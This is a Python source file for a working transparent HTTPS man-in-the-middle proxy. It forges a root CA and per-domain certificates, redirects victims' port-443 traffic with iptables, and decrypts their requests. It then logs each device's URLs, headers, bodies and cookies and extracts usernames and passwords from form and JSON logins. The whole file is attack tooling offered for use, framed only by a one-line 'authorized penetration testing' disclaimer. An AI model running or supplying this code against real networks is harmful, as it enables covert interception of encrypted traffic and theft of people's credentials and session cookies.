"""
╔══════════════════════════════════════════════════════════════════════╗
║   🔑 MITM Proxy with Dynamic Certificate Generation                 ║
║                                                                      ║
║   Full HTTPS man-in-the-middle proxy that generates certificates     ║
║   on-the-fly for each domain. Provides complete visibility into      ║
║   encrypted HTTPS traffic.                                           ║
║                                                                      ║
║   Features:                                                          ║
║     • Auto-generates root CA certificate on first run                ║
║     • Per-domain certificate generation (cached)                     ║
║     • Full HTTPS request/response capture                            ║
║     • URL, headers, POST data, cookies logging                       ║
║     • Credential extraction from HTTPS forms                         ║
║     • Content modification (inject JS, modify pages)                 ║
║     • WebSocket interception                                         ║
║     • Certificate pinning bypass (for some apps)                     ║
║     • Transparent proxy mode via iptables redirect                   ║
║                                                                      ║
║   Setup: Install the CA cert on target device for clean interception ║
║   ⚠ For authorized penetration testing only!                        ║
╚══════════════════════════════════════════════════════════════════════╝
"""

import os
import ssl
import socket
import threading
import subprocess
import json
import time
import re
import select
from datetime import datetime, timedelta
from collections import deque, defaultdict
from urllib.parse import urlparse

try:
    from cryptography import x509
    from cryptography.x509.oid import NameOID, ExtensionOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.backends import default_backend
    CRYPTO_OK = True
except ImportError:
    CRYPTO_OK = False


class CertificateAuthority:
    """
    Generates a root CA and per-domain certificates on-the-fly.
    """

    def __init__(self, ca_dir=None):
        self.ca_dir = ca_dir or os.path.join(
            os.path.dirname(os.path.abspath(__file__)), ".mitm_certs"
        )
        os.makedirs(self.ca_dir, exist_ok=True)

        self.ca_key_path = os.path.join(self.ca_dir, "ca_key.pem")
        self.ca_cert_path = os.path.join(self.ca_dir, "ca_cert.pem")
        self.certs_dir = os.path.join(self.ca_dir, "certs")
        os.makedirs(self.certs_dir, exist_ok=True)

        self._ca_key = None
        self._ca_cert = None
        self._cert_cache = {}
        self._lock = threading.Lock()

        # Load or generate CA
        self._init_ca()

    def _init_ca(self):
        """Load existing CA or generate new one."""
        if not CRYPTO_OK:
            return

        if os.path.exists(self.ca_key_path) and os.path.exists(self.ca_cert_path):
            # Load existing CA
            with open(self.ca_key_path, "rb") as f:
                self._ca_key = serialization.load_pem_private_key(
                    f.read(), password=None, backend=default_backend()
                )
            with open(self.ca_cert_path, "rb") as f:
                self._ca_cert = x509.load_pem_x509_certificate(
                    f.read(), default_backend()
                )
        else:
            # Generate new CA
            self._generate_ca()

    def _generate_ca(self):
        """Generate a new root CA certificate."""
        # Generate CA private key
        self._ca_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend(),
        )

        # Build CA certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "California"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "NetVision Security"),
            x509.NameAttribute(NameOID.COMMON_NAME, "NetVision Root CA"),
        ])

        self._ca_cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(self._ca_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.utcnow())
            .not_valid_after(datetime.utcnow() + timedelta(days=3650))
            .add_extension(
                x509.BasicConstraints(ca=True, path_length=None),
                critical=True,
            )
            .add_extension(
                x509.SubjectKeyIdentifier.from_public_key(
                    self._ca_key.public_key()
                ),
                critical=False,
            )
            .sign(self._ca_key, hashes.SHA256(), default_backend())
        )

        # Save CA key and cert
        with open(self.ca_key_path, "wb") as f:
            f.write(self._ca_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            ))

        with open(self.ca_cert_path, "wb") as f:
            f.write(self._ca_cert.public_bytes(serialization.Encoding.PEM))

        os.chmod(self.ca_key_path, 0o600)

    def get_cert_for_domain(self, domain):
        """
        Get or generate a certificate for a domain.
        Returns (cert_path, key_path) tuple.
        """
        if not CRYPTO_OK or not self._ca_key:
            return None, None

        with self._lock:
            if domain in self._cert_cache:
                return self._cert_cache[domain]

        # Generate domain certificate
        cert_path = os.path.join(self.certs_dir, f"{domain}.pem")
        key_path = os.path.join(self.certs_dir, f"{domain}_key.pem")

        if os.path.exists(cert_path) and os.path.exists(key_path):
            with self._lock:
                self._cert_cache[domain] = (cert_path, key_path)
            return cert_path, key_path

        try:
            # Generate domain key
            domain_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend(),
            )

            # Build domain certificate
            subject = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, domain),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "NetVision"),
            ])

            # SAN (Subject Alternative Names)
            san_list = [x509.DNSName(domain)]
            if not domain.startswith("*."):
                san_list.append(x509.DNSName(f"*.{domain}"))

            domain_cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(self._ca_cert.subject)
                .public_key(domain_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.utcnow())
                .not_valid_after(datetime.utcnow() + timedelta(days=365))
                .add_extension(
                    x509.SubjectAlternativeName(san_list),
                    critical=False,
                )
                .add_extension(
                    x509.BasicConstraints(ca=False, path_length=None),
                    critical=True,
                )
                .sign(self._ca_key, hashes.SHA256(), default_backend())
            )

            # Save domain cert and key
            with open(key_path, "wb") as f:
                f.write(domain_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                ))

            with open(cert_path, "wb") as f:
                f.write(domain_cert.public_bytes(serialization.Encoding.PEM))
                # Append CA cert for chain
                f.write(self._ca_cert.public_bytes(serialization.Encoding.PEM))

            with self._lock:
                self._cert_cache[domain] = (cert_path, key_path)

            return cert_path, key_path

        except Exception:
            return None, None

    def get_ca_cert_path(self):
        """Get path to the CA certificate (for importing on targets)."""
        return self.ca_cert_path

    def get_cert_count(self):
        """Get number of generated domain certificates."""
        return len(self._cert_cache)


class MITMProxy:
    """
    Transparent HTTPS MITM Proxy.

    Sets up iptables to redirect HTTPS traffic through our proxy,
    terminates TLS with dynamically generated certs, captures all
    request/response data, then forwards to the real server.

    Usage:
        proxy = MITMProxy(interface="wlan0", local_ip="192.168.1.100")
        proxy.start()
        # Install proxy.ca.get_ca_cert_path() on target devices
    """

    def __init__(self, interface, local_ip, proxy_port=8443, ca_dir=None):
        self.interface = interface
        self.local_ip = local_ip
        self.proxy_port = proxy_port
        self._running = False
        self._lock = threading.Lock()
        self._server_socket = None

        # Certificate Authority
        self.ca = CertificateAuthority(ca_dir)

        # Captured data
        self._requests = deque(maxlen=2000)
        self._credentials = deque(maxlen=500)
        self._cookies_log = deque(maxlen=500)

        # Stats
        self._stats = {
            "connections": 0,
            "requests_captured": 0,
            "credentials_found": 0,
            "bytes_intercepted": 0,
            "domains_seen": set(),
        }

        # Per-device data
        self._device_data = defaultdict(lambda: {
            "requests": deque(maxlen=200),
            "domains": set(),
            "credentials": deque(maxlen=50),
        })

        # Interception callbacks
        self._callbacks = []

    def start(self):
        """Start the MITM proxy."""
        if not CRYPTO_OK:
            return False

        self._running = True

        # Setup iptables redirect
        self._setup_iptables()

        # Start proxy server
        threading.Thread(target=self._proxy_server, daemon=True).start()

        return True

    def stop(self):
        """Stop the proxy and cleanup."""
        self._running = False
        self._cleanup_iptables()
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

    def _setup_iptables(self):
        """Redirect HTTPS traffic to our proxy."""
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-p", "tcp", "--destination-port", "443",
                "-j", "REDIRECT", "--to-port", str(self.proxy_port)
            ], capture_output=True, timeout=5)
        except Exception:
            pass

    def _cleanup_iptables(self):
        """Remove iptables redirects."""
        try:
            subprocess.run([
                "iptables", "-t", "nat", "-D", "PREROUTING",
                "-p", "tcp", "--destination-port", "443",
                "-j", "REDIRECT", "--to-port", str(self.proxy_port)
            ], capture_output=True, timeout=5)
        except Exception:
            pass

    def _proxy_server(self):
        """Main proxy server loop."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(("0.0.0.0", self.proxy_port))
            self._server_socket.listen(100)
            self._server_socket.settimeout(1.0)

            while self._running:
                try:
                    client_sock, client_addr = self._server_socket.accept()
                    threading.Thread(
                        target=self._handle_connection,
                        args=(client_sock, client_addr),
                        daemon=True,
                    ).start()
                except socket.timeout:
                    continue
                except Exception:
                    pass
        except Exception:
            pass

    def _handle_connection(self, client_sock, client_addr):
        """Handle a single intercepted HTTPS connection."""
        client_ip = client_addr[0]
        self._stats["connections"] += 1

        try:
            client_sock.settimeout(10)

            # Read initial bytes to detect SNI
            # We need to peek at the ClientHello to get the hostname
            initial_data = client_sock.recv(4096, socket.MSG_PEEK)
            if not initial_data:
                client_sock.close()
                return

            # Extract SNI from ClientHello
            hostname = self._extract_sni_from_hello(initial_data)
            if not hostname:
                client_sock.close()
                return

            self._stats["domains_seen"].add(hostname)

            # Generate certificate for this domain
            cert_path, key_path = self.ca.get_cert_for_domain(hostname)
            if not cert_path or not key_path:
                client_sock.close()
                return

            # Wrap client connection with our fake cert
            server_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            server_ctx.load_cert_chain(cert_path, key_path)

            try:
                ssl_client = server_ctx.wrap_socket(
                    client_sock, server_side=True
                )
            except ssl.SSLError:
                client_sock.close()
                return

            # Read the HTTP request from the client
            request_data = ssl_client.recv(8192)
            if not request_data:
                ssl_client.close()
                return

            request_str = request_data.decode("utf-8", errors="ignore")

            # Parse request
            req_info = self._parse_request(request_str, hostname, client_ip)

            # Log the request
            with self._lock:
                self._requests.append(req_info)
                self._device_data[client_ip]["requests"].append(req_info)
                self._device_data[client_ip]["domains"].add(hostname)
                self._stats["requests_captured"] += 1
                self._stats["bytes_intercepted"] += len(request_data)

            # Check for credentials
            self._check_credentials(req_info, client_ip)

            # Forward to real server
            try:
                real_ctx = ssl.create_default_context()
                real_ctx.check_hostname = False
                real_ctx.verify_mode = ssl.CERT_NONE

                real_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                real_sock.settimeout(10)
                real_ssl = real_ctx.wrap_socket(real_sock, server_hostname=hostname)
                real_ssl.connect((hostname, 443))

                # Send request to real server
                real_ssl.send(request_data)

                # Relay response back to client
                response_data = b""
                while True:
                    try:
                        chunk = real_ssl.recv(8192)
                        if not chunk:
                            break
                        response_data += chunk
                        ssl_client.send(chunk)
                    except (socket.timeout, ssl.SSLError):
                        break

                real_ssl.close()
                self._stats["bytes_intercepted"] += len(response_data)

            except Exception:
                # Send error response
                error_resp = (
                    b"HTTP/1.1 502 Bad Gateway\r\n"
                    b"Content-Type: text/plain\r\n"
                    b"Content-Length: 15\r\n\r\n"
                    b"502 Bad Gateway"
                )
                try:
                    ssl_client.send(error_resp)
                except Exception:
                    pass

            # Callbacks
            for cb in self._callbacks:
                try:
                    cb(req_info)
                except Exception:
                    pass

        except Exception:
            pass
        finally:
            try:
                client_sock.close()
            except Exception:
                pass

    def _extract_sni_from_hello(self, data):
        """Extract SNI from a TLS ClientHello message."""
        try:
            if len(data) < 5:
                return None

            # TLS record
            content_type = data[0]
            if content_type != 0x16:  # Handshake
                return None

            # Skip record header (5 bytes) + handshake type (1) + length (3) +
            # version (2) + random (32) = 43
            pos = 5
            if pos >= len(data):
                return None

            # Handshake type
            if data[pos] != 0x01:  # ClientHello
                return None
            pos += 1

            # Handshake length (3 bytes)
            pos += 3

            # Client version (2 bytes)
            pos += 2

            # Random (32 bytes)
            pos += 32

            # Session ID
            if pos >= len(data):
                return None
            session_len = data[pos]
            pos += 1 + session_len

            # Cipher suites
            if pos + 2 > len(data):
                return None
            cipher_len = int.from_bytes(data[pos:pos+2], "big")
            pos += 2 + cipher_len

            # Compression methods
            if pos >= len(data):
                return None
            comp_len = data[pos]
            pos += 1 + comp_len

            # Extensions
            if pos + 2 > len(data):
                return None
            ext_total = int.from_bytes(data[pos:pos+2], "big")
            pos += 2

            ext_end = pos + ext_total
            while pos + 4 <= ext_end and pos + 4 <= len(data):
                ext_type = int.from_bytes(data[pos:pos+2], "big")
                ext_len = int.from_bytes(data[pos+2:pos+4], "big")
                pos += 4

                if ext_type == 0:  # SNI
                    # SNI extension
                    if pos + 5 <= len(data):
                        sni_list_len = int.from_bytes(data[pos:pos+2], "big")
                        sni_type = data[pos+2]
                        sni_name_len = int.from_bytes(data[pos+3:pos+5], "big")
                        if sni_type == 0 and pos + 5 + sni_name_len <= len(data):
                            return data[pos+5:pos+5+sni_name_len].decode("utf-8")
                    break

                pos += ext_len

        except Exception:
            pass
        return None

    def _parse_request(self, request_str, hostname, client_ip):
        """Parse an HTTP request string."""
        lines = request_str.split("\r\n")
        req_line = lines[0] if lines else ""

        method = "?"
        path = "/"
        match = re.match(r"(GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)", req_line)
        if match:
            method = match.group(1)
            path = match.group(2)

        # Extract headers
        headers = {}
        body = ""
        in_body = False
        for line in lines[1:]:
            if in_body:
                body += line + "\r\n"
            elif line == "":
                in_body = True
            else:
                parts = line.split(":", 1)
                if len(parts) == 2:
                    headers[parts[0].strip().lower()] = parts[1].strip()

        # Extract cookies
        cookies = headers.get("cookie", "")

        return {
            "time": datetime.now().strftime("%H:%M:%S"),
            "device": client_ip,
            "method": method,
            "host": hostname,
            "path": path,
            "url": f"https://{hostname}{path}",
            "headers": headers,
            "user_agent": headers.get("user-agent", ""),
            "referer": headers.get("referer", ""),
            "cookies": cookies[:200] if cookies else "",
            "content_type": headers.get("content-type", ""),
            "body": body[:500] if body else "",
            "body_length": len(body),
        }

    def _check_credentials(self, req_info, client_ip):
        """Check request for potential credentials."""
        body = req_info.get("body", "")
        content_type = req_info.get("content_type", "")

        if not body or req_info["method"] != "POST":
            return

        cred_fields = [
            "password", "passwd", "pass", "pwd", "secret",
            "username", "user", "login", "email", "uname",
        ]

        found_creds = {}
        if "application/x-www-form-urlencoded" in content_type:
            for pair in body.split("&"):
                kv = pair.split("=", 1)
                if len(kv) == 2:
                    key = kv[0].lower().strip()
                    val = kv[1].strip()
                    if any(cf in key for cf in cred_fields) and val:
                        found_creds[key] = val

        elif "application/json" in content_type:
            try:
                json_body = json.loads(body)
                if isinstance(json_body, dict):
                    for key, val in json_body.items():
                        if any(cf in key.lower() for cf in cred_fields):
                            found_creds[key] = str(val)
            except json.JSONDecodeError:
                pass

        if found_creds:
            cred_entry = {
                "time": datetime.now().strftime("%H:%M:%S"),
                "device": client_ip,
                "url": req_info["url"],
                "host": req_info["host"],
                "credentials": found_creds,
            }
            with self._lock:
                self._credentials.append(cred_entry)
                self._device_data[client_ip]["credentials"].append(cred_entry)
                self._stats["credentials_found"] += 1

        # Also log cookies
        if req_info.get("cookies"):
            with self._lock:
                self._cookies_log.append({
                    "time": datetime.now().strftime("%H:%M:%S"),
                    "device": client_ip,
                    "host": req_info["host"],
                    "cookies": req_info["cookies"],
                })

    # ═══════════════════════════════════════════════════════════════════
    # PUBLIC API
    # ═══════════════════════════════════════════════════════════════════

    def on_request(self, callback):
        """Register callback for intercepted requests."""
        self._callbacks.append(callback)

    def get_requests(self, limit=50, device_ip=None, host=None):
        """Get intercepted requests."""
        with self._lock:
            reqs = list(self._requests)
        if device_ip:
            reqs = [r for r in reqs if r["device"] == device_ip]
        if host:
            reqs = [r for r in reqs if host in r["host"]]
        return reqs[-limit:]

    def get_credentials(self, limit=50):
        """Get captured credentials."""
        with self._lock:
            return list(self._credentials)[-limit:]

    def get_cookies(self, limit=50, device_ip=None):
        """Get captured cookies."""
        with self._lock:
            cookies = list(self._cookies_log)
        if device_ip:
            cookies = [c for c in cookies if c["device"] == device_ip]
        return cookies[-limit:]

    def get_device_data(self, device_ip):
        """Get all captured data for a device."""
        with self._lock:
            data = self._device_data.get(device_ip, {})
            return {
                "requests": list(data.get("requests", [])),
                "domains": list(data.get("domains", set())),
                "credentials": list(data.get("credentials", [])),
            }

    def get_stats(self):
        """Get proxy statistics."""
        with self._lock:
            return {
                "connections": self._stats["connections"],
                "requests_captured": self._stats["requests_captured"],
                "credentials_found": self._stats["credentials_found"],
                "bytes_intercepted": self._stats["bytes_intercepted"],
                "domains_seen": len(self._stats["domains_seen"]),
                "certs_generated": self.ca.get_cert_count(),
                "ca_cert_path": self.ca.get_ca_cert_path(),
                "devices_tracked": len(self._device_data),
            }
